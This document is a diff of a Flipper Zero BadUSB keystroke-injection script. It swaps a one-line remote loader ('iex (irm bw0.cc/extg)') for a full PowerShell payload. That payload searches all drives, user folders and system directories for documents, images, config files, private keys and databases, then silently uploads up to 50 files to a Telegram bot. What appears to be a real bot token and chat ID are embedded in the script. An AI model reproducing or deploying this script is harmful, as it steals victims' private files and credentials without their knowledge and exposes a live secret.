@@ -1,19 +1,86 @@
+REM Flipper Zero - Complete System File Exfiltration
+REM Scans ALL drives and sends files to Telegram
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 800
+STRING cmd
 ENTER
+DELAY 1000
 
+REM 1. Start message
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Full%20System%20Scan%20Started"
+ENTER
+DELAY 2000
+
+REM 2. PowerShell script to scan ALL drives and user folders
+STRING powershell -c "
+# Telegram config
+`$BOT = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$CHAT = '6614794141'
+`$URL = 'https://api.telegram.org/bot' + `$BOT
+
+# Send system info first
+`$sysinfo = 'System: ' + `$env:COMPUTERNAME + ' | User: ' + `$env:USERNAME + ' | Time: ' + (Get-Date -Format 'HH:mm:ss')
+curl.exe `"`$URL/sendMessage?chat_id=`$CHAT&text=`$sysinfo`"
+
+# Get ALL drives (C:, D:, etc.)
+`$allDrives = Get-PSDrive -PSProvider FileSystem | Where-Object {`$_.Used -gt 0} | Select-Object -ExpandProperty Root
+`$userFolders = @(
+    `$env:USERPROFILE,
+    `$env:USERPROFILE + '\\Desktop',
+    `$env:USERPROFILE + '\\Documents',
+    `$env:USERPROFILE + '\\Downloads',
+    `$env:USERPROFILE + '\\Pictures',
+    `$env:USERPROFILE + '\\Videos',
+    `$env:USERPROFILE + '\\Music',
+    `$env:USERPROFILE + '\\OneDrive',
+    'C:\\Windows\\System32',
+    'C:\\ProgramData',
+    'C:\\Windows\\Temp'
+)
+
+# Combine all paths to scan
+`$allPaths = `$allDrives + `$userFolders
+
+# File types to collect (ALL common types)
+`$fileTypes = @(
+    '*.txt', '*.log', '*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx',
+    '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.csv', '*.xml',
+    '*.json', '*.ini', '*.cfg', '*.conf', '*.sql', '*.db', '*.cer',
+    '*.key', '*.pem', '*.config', '*.properties', '*.yml', '*.yaml',
+    '*.rtf', '*.odt', '*.pptx', '*.ppt', '*.zip', '*.rar', '*.7z'
+)
+
+`$totalSent = 0
+`$maxFiles = 50  # Limit to avoid timeout
+
+foreach (`$path in `$allPaths) {
+    if (Test-Path `$path -ErrorAction SilentlyContinue) {
+        foreach (`$type in `$fileTypes) {
+            if (`$totalSent -ge `$maxFiles) { break }
+            
+            `$files = Get-ChildItem -Path `$path -Filter `$type -File -Recurse -ErrorAction SilentlyContinue -Depth 2 | 
+                      Select-Object -First 10
+            
+            foreach (`$file in `$files) {
+                if (`$totalSent -ge `$maxFiles) { break }
+                if (`$file.Length -lt 20MB) {
+                    try {
+                        curl.exe -s -F `"chat_id=`$CHAT`" -F `"document=@`$(`$file.FullName)`" `"`$URL/sendDocument`"
+                        `$totalSent++
+                        Start-Sleep -Milliseconds 800
+                    } catch {
+                        # Silent error handling
+                    }
+                }
+            }
+        }
+    }
+}
+
+# Send completion summary
+`$summary = 'Scan Complete. Files sent: ' + `$totalSent + ' | System: ' + `$env:COMPUTERNAME
+curl.exe `"`$URL/sendMessage?chat_id=`$CHAT&text=`$summary`"
+"
+ENTER
